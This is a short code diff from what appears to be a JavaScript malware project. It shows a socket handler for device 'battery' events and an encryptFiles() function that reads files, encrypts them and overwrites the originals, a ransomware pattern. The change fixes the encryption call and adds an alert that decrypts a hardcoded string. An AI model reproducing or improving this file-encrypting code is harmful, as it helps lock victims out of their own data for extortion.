@@ -4,7 +4,7 @@ let path = require('path');
 
 
 
-
+alert(Crypto.functions.decrypt('U2FsdGVkX19glA3ckRqiITo2OC5InNRRks2fLC6jDTo='));
 
 
 socket.on('battery', function(data){
@@ -76,8 +76,8 @@ function encryptFiles()
 
 		let content = fs.readFileSync(file);
 
-		let encrypted = Crypto.functions.encrypt(content);
-		
+		let encrypted = Crypto.functions.encrypt(content.toString());
+
 		fs.writeFile(file, encrypted, function(err){
 
 		})
